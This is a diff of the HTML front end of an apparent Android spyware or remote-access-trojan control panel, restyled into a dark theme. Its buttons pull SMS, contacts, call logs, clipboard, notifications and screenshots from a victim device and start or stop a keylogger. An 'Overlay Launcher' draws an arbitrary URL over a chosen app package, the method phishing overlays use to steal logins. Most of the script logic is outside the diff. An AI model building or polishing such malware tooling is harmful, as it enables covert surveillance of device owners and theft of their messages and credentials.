@@ -1,155 +1,209 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Device Control</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      margin: 20px;
-      background: #f9fafb;
-      color: #111;
-    }
-    h2 { margin-bottom: 4px; }
-    p { margin-top: 0; color: #555; }
-    .status {
-      font-size: 0.9em;
-      padding: 3px 8px;
-      border-radius: 5px;
-      display: inline-block;
-      margin-left: 10px;
-    }
-    .online { background: #d1fae5; color: #065f46; }
-    .offline { background: #fee2e2; color: #991b1b; }
-    button {
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: none;
-      margin-right: 8px;
-      cursor: pointer;
-      color: #fff;
-      font-weight: 600;
-    }
-    .fetch { background: #10b981; }
-    .upload { background: #2563eb; }
-    .close { background: #ef4444; }
-    #log {
-      white-space: pre-wrap;
-      background: #fff;
-      border: 1px solid #eee;
-      padding: 10px;
-      border-radius: 8px;
-      margin-top: 10px;
-      min-height: 180px;
-      max-height: 70vh;
-      overflow: auto;
-      font-family: monospace;
-      font-size: 13px;
-    }
-  </style>
-  
-  
-  <style>
-  #screenshotsContainer {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-    gap: 16px;
-    margin-top: 10px;
-  }
+<meta charset="utf-8">
+<title>Device Control</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-  .shotItem {
-    background: #fafafa;
-    border: 1px solid #ccc;
-    padding: 10px;
-    border-radius: 8px;
-    text-align: center;
-  }
+<style>
+/* GLOBAL STYLE */
+body {
+  margin: 0;
+  padding: 0;
+  background: #0d1117;
+  font-family: system-ui, sans-serif;
+  color: #e6edf3;
+}
 
-  .shotItem img {
-    max-width: 100%;
-    height: auto;
-    border-radius: 6px;
-    cursor: zoom-in;
-  }
+h2, h3 {
+  margin: 0 0 10px 0;
+  font-weight: 600;
+}
 
-  .shotItem button {
-    margin-top: 10px;
-    padding: 6px 10px;
-    background: #2563eb;
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    font-weight: 600;
-    width: 100%;
-  }
+.container {
+  padding: 20px;
+}
+
+/* HEADER */
+.headerBox {
+  background: #161b22;
+  border: 1px solid #30363d;
+  padding: 20px;
+  border-radius: 10px;
+  margin-bottom: 20px;
+}
+
+.status {
+  padding: 4px 10px;
+  border-radius: 6px;
+  font-size: 0.9em;
+  margin-left: 10px;
+}
+.online { background: #05632c; }
+.offline { background: #7f1d1d; }
+
+/* CARDS */
+.card {
+  background: #161b22;
+  border: 1px solid #30363d;
+  padding: 15px;
+  border-radius: 10px;
+  margin-bottom: 20px;
+}
+
+/* BUTTONS */
+button {
+  padding: 8px 14px;
+  border-radius: 6px;
+  border: none;
+  cursor: pointer;
+  color: #fff;
+  font-weight: 600;
+  margin: 6px 6px 6px 0;
+  transition: 0.2s;
+}
+
+button:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 0 10px rgba(0,255,170,0.4);
+}
+
+.fetch { background: #238636; }
+.upload { background: #2563eb; }
+.close  { background: #d32f2f; }
+
+/* INPUTS */
+input {
+  padding: 7px;
+  width: 280px;
+  border-radius: 6px;
+  border: 1px solid #30363d;
+  background: #0d1117;
+  color: #fff;
+  margin-bottom: 8px;
+}
+
+/* LOG TERMINAL */
+#log {
+  background: #0d1117;
+  border: 1px solid #30363d;
+  padding: 12px;
+  border-radius: 10px;
+  white-space: pre-wrap;
+  height: 240px;
+  overflow-y: auto;
+  margin-top: 10px;
+  font-family: monospace;
+  font-size: 13px;
+  color: #9cdcff;
+}
+
+/* SCREENSHOT GRID */
+#screenshotsContainer {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+  gap: 18px;
+}
+
+.shotItem {
+  background: #161b22;
+  border: 1px solid #30363d;
+  padding: 12px;
+  border-radius: 10px;
+  text-align: center;
+}
+
+.shotItem img {
+  width: 100%;
+  border-radius: 6px;
+  cursor: zoom-in;
+}
+
+.shotItem button {
+  width: 100%;
+  margin-top: 10px;
+}
 </style>
 
-  
-  
 </head>
 <body>
-  <h2 id="devName"></h2>
-  <p>ID: <span id="devId"></span> 
-     <span id="status" class="status offline">Offline</span>
-  </p>
+<div class="container">
 
-  <button class="fetch" id="btnFetch">Fetch Notification</button>
-  <button class="fetch" id="btnStartNotify">Start Notification Listener</button>
-  <button class="close" id="btnStopNotify">Stop Notification Listener</button>
-  <button class="fetch" id="btnFetchSms">Fetch Sms</button>
-  <button class="fetch" id="btnFetchContact">Fetch Contact</button>
-  <button class="fetch" id="btnFetchLog">Fetch Call Logs</button>
-  <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
-  <button class="fetch" id="btnFetchIp">Fetch Ip Address</button>
-  <button class="fetch" id="btnFetchClip">Fetch ClipBoard</button>
-  <button class="fetch" id="btnStartKeyLog">Start KeyLogs</button>
-  <button class="close" id="btnStopKeyLog">Stop KeyLogs</button>
-  <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
-  <button class="fetch" id="btnFetchDevice">Fetch Device Info</button>
-  <button class="fetch" id="btnFetchScreenshot">Fetch Screenshot</button>
-  <button class="fetch" id="btnFetchScreenshotPermission">Fetch Screenshot Permission</button>
-  <button class="upload" id="btnUpload">Upload</button>
-  
-  <!-- Overlay Control Section -->
-<div style="margin-top: 20px; padding: 10px; background: #fff; border-radius: 8px; border: 1px solid #eee;">
-  <h3>Overlay Launcher</h3>
-  
-  <label>
-    Package Name:
-    <input id="pkgInput" type="text" placeholder="e.g. com.google.android.youtube" 
-           style="width: 300px; padding: 6px; margin-bottom: 6px;">
-  </label>
-  <br>
-  
-  <label>
-    URL:
-    <input id="urlInput" type="text" placeholder="e.g. https://google.com"
-           style="width: 300px; padding: 6px; margin-bottom: 6px;">
-  </label>
-  <br>
-  
-  <button class="fetch" id="btnCustomOverlay">Start Overlay (Custom)</button>
-  <button class="close" id="btnStopOverlay">Stop Overlay</button>
+  <!-- Header -->
+  <div class="headerBox">
+    <h2 id="devName"></h2>
+    <p style="margin:0;">
+      Device ID: <span id="devId"></span>
+      <span id="status" class="status offline">Offline</span>
+    </p>
+  </div>
+
+  <!-- Command Controls -->
+  <div class="card">
+    <h3>Device Commands</h3>
+
+    <button class="fetch" id="btnFetch">Fetch Notification</button>
+    <button class="fetch" id="btnStartNotify">Start Notification Listener</button>
+    <button class="close" id="btnStopNotify">Stop Notification Listener</button>
+
+    <button class="fetch" id="btnFetchSms">Fetch SMS</button>
+    <button class="fetch" id="btnFetchContact">Fetch Contacts</button>
+    <button class="fetch" id="btnFetchLog">Fetch Call Logs</button>
+    <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
+    <button class="fetch" id="btnFetchIp">Fetch IP</button>
+    <button class="fetch" id="btnFetchClip">Fetch Clipboard</button>
+
+    <button class="fetch" id="btnStartKeyLog">Start Keylogs</button>
+    <button class="close" id="btnStopKeyLog">Stop Keylogs</button>
+    <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
+
+    <button class="fetch" id="btnFetchDevice">Fetch Device Info</button>
+    <button class="fetch" id="btnFetchScreenshot">Fetch Screenshot</button>
+    <button class="fetch" id="btnFetchScreenshotPermission">Grant Screenshot Permission</button>
+
+    <button class="upload" id="btnUpload">Upload</button>
+    <button class="close" id="btnClose">Close</button>
+  </div>
+
+  <!-- Overlay Launcher -->
+  <div class="card">
+    <h3>Overlay Launcher</h3>
+
+    <div>
+      <label>Package Name:</label><br>
+      <input id="pkgInput" type="text" placeholder="com.example.app">
+    </div>
+
+    <div>
+      <label>URL:</label><br>
+      <input id="urlInput" type="text" placeholder="https://example.com">
+    </div>
+
+    <button class="fetch" id="btnCustomOverlay">Start Overlay</button>
+    <button class="close" id="btnStopOverlay">Stop Overlay</button>
+  </div>
+
+  <!-- Screenshots -->
+  <div class="card">
+    <h3>Screenshot Gallery</h3>
+    <div id="screenshotsContainer"></div>
+  </div>
+
+  <!-- Log Window -->
+  <div class="card">
+    <h3>Event Log</h3>
+    <pre id="log">Connecting...</pre>
+  </div>
+
 </div>
 
-  
-  
-  <button class="close" id="btnClose">Close</button>
-  
-  
-  <div id="screenshotsContainer"></div>
 
- 
+<!-- Your Existing JavaScript (unchanged) -->
+<script>
 
 
-  <pre id="log">Connecting...</pre>
-  
- 
 
-  <script>
-    // --- Extract device info from URL ---
+// --- Extract device info from URL ---
     const pathParts = window.location.pathname.split("/");
     const clientId = pathParts[pathParts.length - 1];
     const urlParams = new URLSearchParams(location.search);
@@ -324,6 +378,10 @@
     };
 
     window.pushRemoteLog = pushLog;
-  </script>
+
+
+
+</script>
+
 </body>
 </html>
